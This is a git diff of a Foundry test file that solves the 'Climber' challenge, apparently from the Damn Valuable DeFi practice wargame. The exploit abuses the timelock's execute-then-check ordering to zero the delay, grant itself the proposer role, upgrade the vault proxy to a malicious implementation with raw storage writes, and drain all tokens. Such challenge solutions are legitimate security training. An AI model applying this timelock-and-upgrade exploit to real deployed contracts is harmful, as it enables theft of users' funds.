@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import {ERC1967Utils} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
 contract ClimberChallenge is Test {
@@ -86,24 +87,32 @@ contract ClimberChallenge is Test {
      */
     function test_climber() public checkSolvedByPlayer {
         Attacker attacker = new Attacker();
-        address[] memory targets = new address[](4);
+        address[] memory targets = new address[](5);
         targets[0] = address(timelock);
         targets[1] = address(timelock);
         targets[2] = address(vault);
-        targets[3] = address(attacker);
+        targets[3] = address(vault);
+        targets[4] = address(attacker);
 
-        uint256[] memory values = new uint256[](4); // init to zeros by default
+        uint256[] memory values = new uint256[](5); // init to zeros by default
 
-        bytes[] memory dataElements = new bytes[](4);
-        bytes memory changeDelayData = abi.encodeWithSelector(timelock.updateDelay.selector, uint256(0));
-        bytes memory addProposerData = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(attacker));
-        bytes memory addOwnerData = abi.encodeWithSelector(vault.transferOwnership.selector, player);
-        // bytes memory withdrawData = abi.encodeWithSelector(vault.withdraw.selector, address(token), recovery, VAULT_TOKEN_BALANCE);
+        bytes[] memory dataElements = new bytes[](5);
+        bytes memory changeDelayData = abi.encodeWithSelector(timelock.updateDelay.selector, uint256(0)); // This is required to pass the timelock OperationState.ReadyForExecution check
+        bytes memory addProposerData = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(attacker)); // This required to allow the attacker to schedule the operations
+        // bytes memory addOwnerData = abi.encodeWithSelector(vault.transferOwnership.selector, address(timelock)); // Change owner of timelock, not needed in this case
+        bytes memory upgradeVaultImplementationData = abi.encodeWithSelector(
+            vault.upgradeToAndCall.selector,
+            address(new NewVaultImplementation()),
+            "" // abi.encodeWithSelector(NewVaultImplementation.overrideStorageSlot.selector, uint256(1), uint256(uint160(address(timelock)))) // we can also override the sweeper, but there is no need in this case
+        );
+        bytes memory withdrawAllTokensData = abi.encodeWithSelector(NewVaultImplementation.withdrawAllTokens.selector, address(token), recovery);
+
         bytes memory scheduleData = abi.encodeWithSignature("scheduleWithData()");
         dataElements[0] = changeDelayData;
         dataElements[1] = addProposerData;
-        dataElements[2] = addOwnerData;
-        dataElements[3] = scheduleData;
+        dataElements[2] = upgradeVaultImplementationData;
+        dataElements[3] = withdrawAllTokensData;
+        dataElements[4] = scheduleData;
         bytes32 salt = bytes32(0);
 
         attacker.setScheduleData( // Need this to add a schedule in ClimberTimelock first
@@ -115,21 +124,6 @@ contract ClimberChallenge is Test {
         );
 
         timelock.execute(targets, values, dataElements, bytes32(0));
-
-        vm.warp(block.timestamp + 15 days + 1); // Todo update the vault contract to override the withdraw timestamp, so we don't have to wait for 15 days?
-
-        while (true){
-            uint256 balance = token.balanceOf(address(vault));
-            if (balance > 1 ether){
-                balance = 1 ether;
-            }
-            if (balance == 0){
-                break;
-            }
-            // vm.warp(block.timestamp + 15 days + 1);
-            vault.withdraw(address(token), recovery, balance);
-        }
-
     }
 
     /**
@@ -166,4 +160,18 @@ contract Attacker{
         timelock.schedule(targets, values, dataElements, salt);
     }
 
+}
+
+contract NewVaultImplementation{
+    bytes32 public constant proxiableUUID = ERC1967Utils.IMPLEMENTATION_SLOT;
+
+    function overrideStorageSlot(uint256 slot, uint256 value) public {
+        assembly {
+            sstore(slot, value)
+        }
+    }
+
+    function withdrawAllTokens(address token, address recipient) external {
+        DamnValuableToken(token).transfer(recipient, DamnValuableToken(token).balanceOf(address(this)));
+    }
 }
